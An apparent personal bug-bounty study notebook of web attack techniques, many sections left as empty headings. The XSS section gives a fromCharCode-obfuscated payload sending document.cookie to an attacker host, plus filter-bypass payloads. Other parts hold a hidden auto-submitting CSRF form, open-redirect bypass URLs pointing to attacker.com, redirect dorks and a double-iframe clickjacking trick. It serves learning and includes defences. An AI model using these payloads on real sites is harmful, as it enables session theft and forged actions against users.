


# <font color="red">XSS</font>
#### 1- check for any value you can control (parameter , path, header, cookie) is being reflected in the **HTML** or used by **JS** code  



##### <font color="red">NOTE</font>:  for testing to find xss instead of splashing different payloads test for these characters and note that which  one of them getrendered directly and which one escapes>'<"//:=;!--
##### <font color="red">NOTE</font>: for bypassing the xss protections you can use <font color="green">1- </font>alternative javascripts <font color="green">2-</font> Capitalization and Encoding <font color="green">3-</font> If the application filters special HTML characters, like single and double quotes, you can’t write any strings into your XSS payload directly. But you could try using the JavaScript fromCharCode() function, which maps numeric codes to the corresponding ASCII characters, to create the string you need. For example, this piece of code is equivalent to the string "http://attacker_server_ip/?c=" like: String.fromCharCode(104, 116, 116, 112, 58, 47, 47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118, 101, 114, 95, 105, 112, 47, 63, 99, 61) for example for a payload this is how it is : _<scrIPT_>location=String.fromCharCode(104, 116, 116, 112, 58, 47,47, 97, 116, 116, 97, 99, 107, 101, 114, 95, 115, 101, 114, 118,101, 114, 95, 105, 112, 47, 63, 99, 61)+document.cookie;_< /scrIPT_>  for getting the char code of the string you want you can use this code: function ascii(c){return c.charCodeAt();} encoded = "http://attacker_server_ip/?c=".split("").map(ascii); document.write(encoded);<font color="green">4-</font> Filter Logic Errors and ...

#### if <font color="red">reflected</font>: 
####  <font color="red">   in raw HTML : </font>
#####           1- create HTML tag?
#####           2-use events or attribiutes supporting javascript: protocol ?
#####           3- HTML content being interpreted by any client side JS engine (Angular , Vue , Mavo ...)? -> you can abuse  a [CSTI](https://book.hacktricks.xyz/pentesting-web/client-side-template-injection-csti) and [THIS](https://portswigger.net/research/abusing-javascript-frameworks-to-bypass-xss-mitigations)

#####           4-bypass protection
#####           5-if can not create tags that excecute JS code , could you abuse [dangling markup](https://book.hacktricks.xyz/pentesting-web/dangling-markup-html-scriptless-injection) 


####     <font color="red">in  HTML tag :</font> 
#####     1-exit the html tag?
#####     2-create new events/attributes to execute JS code?
#####     3-the attr you trapped support JS execution? 
#####     4-bypass protection?
#####     <font color="red">NOTE</font>: If your input is reflected inside "**unexpoitable tags**" you could try the `**accesskey**` trick to abuse the vuln (you will need some kind of social engineer to exploit this): `**" accesskey="x" onclick="alert(1)" x="**`
##### <font color="red">NOTE</font>: in url schemes like href="Javascript:"/src="" you  can use "data:" too. like data:text/html;base64,PHNjcmlwdD5hbGVydCgnWFNTIGJ5IFZpY2tpZScpPC9zY3JpcHQ+"  this for exampel would execute the alert function (it doesn't need to be base64 ecoded it could be injected as data:text/html,java script payload)
##### <font color="red">NOTE</font>: Anotherway of approaching manual XSS testing is to insert an XSS polyglot, a type of XSS payload that executes in multiple contexts. For example, it will execute regardless of whether it is inserted into an <img> tag, a script tag, or a generic "p" tag and can bypass some XSS filters.(https://web.archive.org/web/20190617111911/https://polyglot.innerht.ml/)=>
	javascript:"/*\"/*`/*' /*_</template_>
	_</textarea_>_</noembed_>_</noscript_>_</title_>
	_</style_>_</script_>--_>&lt;svg onload=/*<html/*/onmouseover=alert()//_>

	

####    <font color="red"> in JavaScript code :</font > 
#####     1-escape `<script>` tag?
#####     2-escape string execute your own js code?
#####     3-are your input in template literals \`\`?
#####     4-bypass protection?
#####     <font color="green">NOTE</font>: If reflected between `**<script> [...] </script>**` tags, even if your input if inside any kind of quotes, you can try to inject `</script>` and escape from this context. This works because the **browser will first parse the HTML tags** and then the content, therefore, it won't notice that your injected `</script>` tag is inside the HTML code.

#####    <font color="green"> NOTE</font>: If reflected **inside a JS string** and the last trick isn't working you would need to **exit** the string, **execute** your code and **reconstruct** the JS code (if there is any error, it won't be executed:

#####     <font color="green"> NOTE</font>: If reflected inside template literals you can **embed JS expressions** using `${ ... }` syntax: `` var greetings = `Hello, ${alert(1)}` ``
#####    <font color="green"> NOTE</font>: unicode encode works for writing valid javascript codes
	\u{61}lert(1) \u0061lert(1) \u{0061}lert(1)

####     <font color="red">in JavaScript file being executed :</font>
#####         1-indicate the name of function to execute e.g `?callback=alert(1)`

#####    <font color="green"> NOTE</font>: everal web pages have endpoints that accept as parameter **the name of the function to execute**. firstElementChild
`lastElementChild, nextElementSibiling, lastElementSibiling, parentElement` 
#####     <font color="red"> SOME(Same Origin Method Execution)</font>
######         the attack flow is the following:
######            . Find a **callback that you can abuse** (potentially limited to \[\\w\\._\]).

######             If it's not limited and you can execute any JS, you could just abuse this as a regular XSS
######             . Make the **victim open a page** controlled by the **attacker**
######            . The **page will open itself** in a **different window** (the new window will have the object `**opener**` referencing the initial one)

######             . The **initial page** will load the **page** where the **interesting DOM** is located.
######             . The **second page** will load the **vulnerable page abusing the callback** and using the `**opener**` object to **access and execute some action in the initial page** (which now contains the interesting DOM).

#### if <font color="red">DOM </font> :

#### if <font color="red">Stored</font> : 

## <font color="GREEN"> TO READ </font>
### <font color="orange">LINKS:</font>
- [ ] https://portswigger.net/web-security/cross-site-scripting/cheat-sheet/
- [ ]  https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting 
- [ ]  https://portswigger.net/research/dom-based-angularjs-sandbox-escapes#indirectcall 
- [x] https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/debugging-client-side-js
- [x] https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/js-hoisting
- [x] https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/some-same-origin-method-execution
- [ ] https://book.hacktricks.xyz/pentesting-web/xss-cross-site-scripting/dom-xss


# <font color="red">RCE</font>


# <font color="red" >XXE</font>


# <font color="red">RACE</font>


# <font color="red">CORS</font>



# <font color="red">SQLi</font> 



# <font color="red"> HOST HEADER INJ..</font>


# <font color="red">HTTP SMUGGLING </font>



# <font color="red">FILE INCLUSION / PATH TRAVERSAL</font>


# <font color="red">0Auth</font>


# <font color="red" >SSTI</font>


# <font color="red">CSTI</font>

# <font color="red">SSRF</font>


# <font color="red">CSRF</font>
## <font color="red">Mechanism</font>:
#### the web server establishes a new session: it sends your browser a session cookie associated with the session, and this cookie proves your identity to the server.
#### Your browser receives the session cookie, stores it, and sends it along via the Cookie HTTP request header in every one of your requests.

#### Armed with your session cookie, you can carry out authenticated actions like accessing confidential information, changing your password, or sending a private message without reentering your password.

#### So if the website is vulnerable to csrf a third website can create a page on their host webpage  a code like :
	<html>
	1 <h1>Send a tweet.</h1>
	2 <form method="POST" action="https://twitter.com/send_a_tweet">
	3 <input type="text" name="tweet_content" value="Hello world!">
	4 <input type="submit" value="Submit">
	</form>
	</html>
#### and the host can send a request to vulnerable site like :
	POST /send_a_tweet
	Host: twitter.com
	Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE
	(POST request body)
	tweet_content="Hello world!"
#### This functionality has a vulnerability: any site, and not just Twitter, can initiate this request.
#### When you click the Submit button on this page, your browser will send a POST request. Because the browser automatically includes your Twitter session cookies in requests to Twitter, Twitter will treat the request as valid,causing your account to tweet Follow @vickieli7 on Twitter! Here’s the corresponding request:
	POST /send_a_tweet
	Host: twitter.com
	Cookie: session_cookie=YOUR_TWITTER_SESSION_COOKIE
	158 Chapter 9
	(POST request body)
	tweet_content="Follow @vickieli7 on Twitter!"
#### Even though this request doesn’t come from Twitter, Twitter will recognize it as valid because it includes your real Twitter session cookie.
	<html>
	<iframe style="display:none" name="csrf-frame"> 1
	<form method="POST" action="https://twitter.com/send_a_tweet"
	target="csrf-frame" id="csrf-form"> 2
	<input type="text" name="tweet_content" value="Follow @vickieli7 on Twitter!">
	<input type='submit' value="Submit">
	</form>
	</iframe>
	<script>document.getElementById("csrf-form").submit();</script> 3
	</html>
#### This HTML places the form in an invisible iframe to hide it from the user’s view. Remember from Chapter 8 that an iframe is an HTML element that embeds another document within the current HTML document. This particular iframe’s style is set to display:none, meaning it won’t be displayed on the page, making the form invisible 1. Then, JavaScript code between the script tags 3 will submit the form with the ID csrf-form 2 without the need for user interaction. The code fetches the HTML form by referring to it by its ID, csrf form. Then the code submits the form by calling the submit()method on it. With this new attack page, any victim who visits the malicious site will be forced to tweet.

## <font color="red">Prevention</font>:

#### The best way to prevent CSRFs is to use CSRF tokens. 
#### Besides implementing CSRF tokens to ensure the authenticity of requests, another way of protecting against CSRF is with SameSite cookies. The Set-Cookie header allows you to use several optional flags to protect your users’ cookies, one of which is the SameSite flag. When the SameSite flag on a cookie is set to Strict, the client’s browser won’t send the cookie during cross-site requests:
	Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict
#### Another possible setting for the SameSite flag is Lax, which tells the client’s browser to send a cookie only in requests that cause top-level navigation (when users actively click a link and navigate to the site). This setting ensures that users still have access to the resources on your site if the cross site request is intentional. For example, if you navigate to Facebook from a third-party site, your Facebook logins will be sent. But if a third-party site initiates a POST request to Facebook or tries to embed the contents of Facebook within an iframe, cookies won’t be sent:
	Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Lax
#### In 2020, Chrome and a few other browsers made SameSite=Lax the default cookie setting if it’s not explicitly set by the web application. Therefore, even if a web application doesn’t implement CSRF protection, attackers won’t be able to attack a victim who uses Chrome with POST CSRF. The efficacy of a classic CSRF attack will likely be greatly reduced, since Chrome has the largest web browser market share. On Firefox, the SameSite default setting is a feature that needs to be enabled. You can enable it by going to about:config and setting network.cookie.sameSite.laxByDefault to true.

#### Even when browsers adopt the SameSite-by-default policy, CSRFs are still possible under some conditions. First, if the site allows state-changing requests with the GET HTTP method, third-party sites can attack users by creating CSRF with a GET request. For example, if the site allows you to change a password with a GET request, you could post a link like this to trick users into clicking it: https://email.example.com/password_change?new_password=abc123.

#### Since clicking this link will cause top-level navigation, the user’s session cookies will be included in the GET request, and the CSRF attack will succeed:
	GET /password_change?new_password=abc123
	Host: email.example.com
	Cookie: session_cookie=YOUR_SESSION_COOKIE
#### n another scenario, sites manually set the SameSite attribute of a cookie to None. Some web applications have features that require third-party sites to send cross-site authenticated requests. In that case, you might explicitly set SameSite on a session cookie to None, allowing the sending of the cookie across origins, so traditional CSRF attacks would still work. Finally, if the victim is using a browser that doesn’t set the SameSite attribute to Lax by default (including Firefox, Internet Explorer, and Safari), traditional CSRF attacks will still work if the target application doesn’t implement diligent CSRF protection.
## <font color="red">Haunt</font>:

## <font color="red">Bypassing</font> CSRF protection:

# <font color="red"> COMMAND INJ..</font>

# <font color="red">OPEN REDIRECT</font>
#### NOTE: THERE IS A WAY TO CHAIN OPEN REDIRECTS TO SSRF AND I DONT KNOW IT YET

#### <font color="red">Referer</font> based :
##### referer headers are a common way of determining the user’s original location, since they contain the URL that linked to the current page. Thus, some sites will redirect to the page’s referer URL automatically after certain user actions, like login or logout. 
#### Test for Referer-Based Open Redirects :
To test
for these, set up a page on a domain you own and host this HTML page:
_<html_>
_<a href="https://example.com/login"_>Click on this link!_</a_>
_</html_>
Replace the linked URL with the target page. Then reload and visit
your HTML page. Click the link and see if you get redirected to your site
automatically or after the required user interactions.

### Parameter based : 
##### <font color="red">NOTE</font>: use google dorks for finding edditional redirect parameters:inurl:%3Dhttp site:example.com also try for inurl:%3D%2F site:example.com 
	inurl:redir site:example.com
	inurl:redirect site:example.com
	inurl:redirecturi site:example.com
	inurl:redirect_uri site:example.com
	inurl:redirecturl site:example.com
	inurl:redirect_uri site:example.com
	inurl:return site:example.com
	inurl:returnurl site:example.com
	inurl:relaystate site:example.com
	inurl:forward site:example.com
	inurl:forwardurl site:example.com
	inurl:forward_url site:example.com
	inurl:url site:example.com
	inurl:uri site:example.com
	inurl:dest site:example.com
	inurl:destination site:example.com
	inurl:next site:example.com

### Bypassing OR protectoin:

#### using browser auto correct :
##### Modern browsers often autocorrect URLs that don’t have the correct components, in order to correct mangled URLs caused by user typos. For example, Chrome will interpret all of these URLs as pointing to https://attacker.com:
	https:attacker.com
	https;attacker.com
	https:\/\/attacker.com
	https:/\/\attacker.com
	These quirks can help you bypass URL validation based on a blocklist
#### Most modern browsers also automatically correct backslashes (\) to forward slashes , meaning they'll treat thease URL'S as the same:
	https:\\example.com
	https://example.com

#### If the validator doesn’t recognize this behavior, the inconsistency could lead to bugs. For example, the following URL is potentially problematic:
	https://attacker.com\@example.com
#### Unless the validator treats the backslash as a path separator, it will interpret the hostname to be example.com, and treat attacker.com\ as the username portion of the URL. But if the browser autocorrects the backslash to a forward slash, it will redirect the user to attacker.com, and treat @example .com as the path portion of the URL, forming the following valid URL:
	https://attacker.com/@example.com
#### Exploiting Flawed Validator Logic :
##### Another way you can bypass the open-redirect validator is by exploiting loopholes in the validator’s logic. For example, as a common defense against open redirects, the URL validator often checks if the redirect URL starts with, contains, or ends with the site’s domain name bypass this type of protection by creating a subdomain or directory with the target’s domain name:
	https://example.com/login?redir=http://example.com.attacker.com
	https://example.com/login?redir=http://attacker.com/example.com
##### To prevent attacks like these from succeeding, the validator might accept only URLs that both start and end with a domain listed on the allowlist. However, it’s possible to construct a URL that satisfies both of these rules.Take a look at this one:
	https://example.com/login?redir=https://example.com.attacker.com/example.com

##### This URL redirects to attacker.com, despite beginning and ending with the target domain. The browser will interpret the first example.com as the subdomain name and the second one as the filepath. Or you could use the at symbol (@) to make the first example.com the username portion of the URL:
	https://example.com/login?redir=https://example.com@attacker.com/example.com
#### Using Data Urls:
##### data URLs use the data: scheme to embed small files in a URL. They are constructed in this format:
	data:MEDIA_TYPE[;base64],DATA
	data:text/html;base64,PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=
##### The data encoded in this URL, PHNjcmlwdD5sb2NhdGlvbj0iaHR0cHM6 Ly9leGFtcGxlLmNvbSI8L3NjcmlwdD4=, is the base64-encoded version of this script:
	_<script_>location="https://example.com"_< /script _>
##### this is just a xss i think

### Exploit URL Decoding:
#### URLs sent over the internet can contain only ASCII characters, which include a set of characters commonly used in the English language and a few special characters. But since URLs often need to contain special characters or characters from other languages, people encode characters by using URL encoding. URL encoding converts a character into a percentage sign, followed by two hex digits; for example, %2f. This is the URL-encoded version of the slash character (/). When validators validate URLs, or when browsers redirect users, they have to first find out what is contained in the URL by decoding any characters that are URL encoded. If there is any inconsistency between how the validator and browsers decode URLs, you could exploit that to your advantage.
#### Double encoding:
	https://example.com%252f@attacker.com
#### Non-ASCII Characters:
##### You can sometimes exploit inconsistencies in the way the validator and browsers decode non-ASCII characters. For example, let’s say that this URL has passed URL validation:
	https://attacker.com%ff.example.com
#### %ff is the character ÿ, which is a non-ASCII character. The validator has determined that example.com is the domain name, and attacker.comÿ is the subdomain name. Several scenarios could happen. Sometimes browsers  decode non-ASCII characters into question marks. In this case, example.com would become part of the URL query, not the hostname, and the browser would navigate to attacker.com instead:
	https://attacker.com?.example.comf140 
	  
##### Another common scenario is that browsers will attempt to find a “most alike”  character. For example, if the character ╱ (%E2%95%B1) appears in a URL like this, the validator might determine that the hostname is example.com:
	https://attacker.com╱.example.com
#### Combine Exploit techniques :
##### To defeat more-sophisticated URL validators, combine multiple strategies to bypass layered defenses. I’ve found the following payload to be useful:
	https://example.com%252f@attacker.com/example.com



# <font color ="red">ESI INJ..</font>

# <font color="red">NOSQL</font>

# <font color="red">LDAP INJ..</font>

# <font color="red">XPATH</font>

# <font color="red">CLICKJACKING</font>

## Mechanism:
#### Clickjacking relies on an HTML feature called an iframe. HTML iframes allow developers to embed one web page within another by placing an _<iframe_> tag on the page, and then specifying the URL to frame in the tag’s src attribute.
##### Iframes are useful for many things. The online advertisements you often see at the top or sides of web pages are examples of iframes; companies use these to include a premade ad in your social media or blog. Iframes also allow you to embed other internet resources, like videos and audio, in your web pages
## Prevention:
#### Two conditions must be met for a clickjacking vulnerability to happen. First,the vulnerable page has to have functionality that executes a state-changing action on the user’s behalf. A state-changing action causes changes to the user’s account in some way, such as changing the user’s account settings or personal data. Second, the vulnerable page has to allow itself to be framed by an iframe on another site. The HTTP response header X-Frame-Options lets web pages indicate whether the page’s contents can be rendered in an iframe. Browsers will follow the directive of the header provided. Otherwise, pages are frameable by default. This header offers two options: DENY and SAMEORIGIN. If a page is served with the DENY option, it cannot be framed at all. The SAMEORIGIN option allows framing from pages of the same origin: pages that share the same protocol, host, and port.
	X-Frame-Options: DENY
	X-Frame-Options: SAMEORIGIN

#### To prevent clickjacking on sensitive actions, the site should serve one of these options on all pages that contain state-changing actions.

#### The Content-Security-Policy response header is another possible defense against clickjacking. This header’s frame-ancestors directive allows sites to indicate whether a page can be framed. For example, setting the directive to 'none' will prevent any site from framing the page, whereas setting the directive to 'self' will allow the current site to frame the page:
	Content-Security-Policy: frame-ancestors 'none';
	Content-Security-Policy: frame-ancestors 'self';
#### Setting frame-ancestors to a specific origin will allow that origin to frame the content. This header will allow the current site, as well as any page on the subdomains of example.com, to frame its contents:
	Content-Security-Policy: frame-ancestors 'self' *.example.com;
#### nother way of protecting against clickjacking is with SameSite cookies.When the SameSite flag on a cookie is set to Strict or Lax, that cookie won't be sent in requests made within a third-party iframe:
	Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Strict
	Set-Cookie: PHPSESSID=UEhQU0VTU0lE; Max-Age=86400; Secure; HttpOnly; SameSite=Lax

### Haunting for it :
#### Find clickjacking vulnerabilities by looking for pages on the target site that contain sensitive state-changing actions and can be framed.
#### <font color="red">Step 1</font>: Look for State-Changing Actions
#### You should also check that the action can be achieved via clicks alone. Clickjacking allows you to forge only a user’s clicks, not their keyboard actions.
#### <font color="red">Step 2</font>: Check the Response Headers
##### See if the page is being served with the X-Frame-Options or Content-Security-Policy header.(or the cookie attribute samesite )
##### Although setting HTTP response headers is the best way to prevent theseattacks, the website might have more obscure safeguards in place. For example,a technique called frame-busting uses JavaScript code to check if the page is in an iframe, and if it’s framed by a trusted site. Frame-busting is an unreliable way to protect against clickjacking. In fact, frame-busting techniques can often be bypassed, as I will demonstrate later in this chapter. You can confirm that a page is frameable by creating an HTML page that frames the target page. If the target page shows up in the frame, the page is frameable.

#### <font color="red">Step 3</font>: Confirm the Vulnerability:
##### Confirm the vulnerability by executing a clickjacking attack on your test account. You should try to execute the state-changing action through the framed page you just constructed and see if the action succeeds. If you can trigger the action via clicks alone through the iframe, the action is vulnerable to clickjacking.

### <font color="red">Bypassing</font> Protections:
#### Here’s an example of what you can try if the website uses frame-busting techniques instead of HTTP response headers and SameSite cookies: find a loophole in the frame-busting code. For instance, developers commonly make the mistake of comparing only the top frame to the current frame when trying to detect whether the protected page is framed by a malicious page. If the top frame has the same origin as the framed page, developers may allow it, because they deem the framing site’s domain to be safe. Essentially, the protection’s code has this structure:
	if (top.location == self.location){
	// Allow framing.
	}
	else{
	// Disallow framing.
	}
#### f that is the case, search for a location on the victim site that allows you toembed custom iframes. For example, many social media sites allows users to share links on their profile. These features often work by embedding the URL in an iframe to display information and a thumbnail of the link. Other common features that require custom iframes are those that allow you to embed videos, audio, images, and custom advertisements and web page builders. If you find one of these features, you might be able to bypass clickjacking protection by using the double iframe trick. This trick works by framing your malicious page within a page in the victim’s domain. First, construct a page that frames the victim’s targeted functionality. Then place the entire page in an iframe hosted by the victim site

#### his way, both top.location and self.location point to victim.com. The frame-busting code would determine that the innermost victim.com page is framed by another victim.com page within its domain, and therefore deem the framing safe. The intermediary attacker page would go undetected.

### <font color="red">Escalate </font> the attack:



### <font color="red">NOTE</font>: Often in bug bounty reports, you’ll need to show companies that real attackers could effectively exploit the vulnerability you found. That means youneed to understand how attackers can exploit clickjacking bugs in the wild.Clickjacking vulnerabilities rely on user interaction. For the attackto succeed, the attacker would have to construct a site that is convincingenough for users to click. This usually isn’t difficult, since users don’t often  take precautions before clicking web pages. But if you want your attack to become more convincing, check out the Social-Engineer Toolkit (https://github.com/trustedsec/social-engineer-toolkit/). This set of tools can, among other things, help you clone famous websites and use them for malicious purposes. You can then place the iframe on the cloned website. In my experience, the most effective location in which to place the hidden button is directly on top of a Please Accept That This Site Uses Cookies! pop-up. Users usually click this button to close the window without much thought.
# <font color="red">CSP BYPASS</font>

# <font color="red">COOKIE HACKING</font>

# <font color="red">2FA/OTP BYPASS</font>

# <font color="red">CAPTCHA BYPASS</font>

# <font color="red">RATE LIMIT BYPASS</font>

# <font color="red">LOGIN BYPASS</font>

# <font color="red">DESERIALIZATION </font>
#### <font color="red">NOTE</font> JWT supports a none option for the algorithm type. If the alg field is set to none, even tokens with empty signature sections would be considered valid.

# <font color="red">JWT VULNS </font>

# <font color="red">IDOR</font>

# <font color="red">DOMAIN/SUBDOMAIN TAKEOVER </font>

# <font color="red">PARAM POLLUTION </font>


# <font color="red">Host Header Inj...</font>
